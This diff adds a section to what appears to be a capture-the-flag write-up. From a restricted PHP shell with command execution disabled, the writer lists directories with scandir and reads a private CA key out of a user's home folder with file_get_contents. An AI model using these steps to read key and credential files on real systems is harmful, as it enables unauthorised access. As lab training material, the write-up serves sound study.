@@ -127,6 +127,102 @@ display_startup_errors => Off => Off
 ...
 ```
 
+Every function that allows for RCE is disabled. However, this doesn't stop us from trying other commands. Following [this](https://angelica.gitbook.io/hacktricks/network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass) post, we can see an extensive list of PHP functions useful for our case. For example, reading our current directory with scandir.
+
+```bash
+$ scandir("./");
+=> [
+     ".",
+     "..",
+     ".DS_Store",
+     "._.DS_Store",
+     "bin",
+     "boot",
+     "dev",
+     "etc",
+     "home",
+     "lib",
+     "lost+found",
+     "media",
+     "mnt",
+     "opt",
+     "proc",
+     "root",
+     "run",
+     "sbin",
+     "srv",
+     "swap",
+     "sys",
+     "tmp",
+     "usr",
+     "var",
+   ]
+$
+```
+We can also check the home directory.
+
+```bash
+$ scandir('/home');
+=> [
+     ".",
+     "..",
+     "berlin",
+     "dali",
+     "nairobi",
+     "oslo",
+     "professor",
+   ]
+$
+```
+Checking on all users, it seems that everyone's home contains a SSH directory. Sadly, none of them are accesible from our current position.
+
+```bash
+$ scandir('/home/berlin');
+=> [
+     ".",
+     "..",
+     ".ash_history",
+     ".ssh",
+     "downloads",
+     "node_modules",
+     "server.js",
+     "user.txt",
+   ]
+$
+```
+```bash
+$ scandir('/home/berlin/.ssh');
+PHP Warning:  scandir(/home/berlin/.ssh): failed to open dir: Permission denied in phar://eval()'d code on line 1
+$
+```
+
+Checking on all users directoires, the most interesting one is `nairobi`. This one contains a ca.key that we can read. To read files, we can use file_get_contents.
+
+```bash
+$ scandir('/home/nairobi');
+=> [
+     ".",
+     "..",
+     "ca.key",
+     "download.jade",
+     "error.jade",
+     "index.jade",
+     "node_modules",
+     "server.js",
+     "static",
+   ]
+
+$ file_get_contents('/home/nairobi/ca.key');
+=> """
+-----BEGIN PRIVATE KEY-----
+MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDPczpU3s4Pmwdb
+7MJsi//m8mm5rEkXcDmratVAk2pTWwWxudo/FFsWAC1zyFV4w2KLacIU7w8Yaz0/
+...
+53udBEzjt3WPqYGkkDknVhjD
+-----END PRIVATE KEY-----
+"""
+$
+```
 
 
 
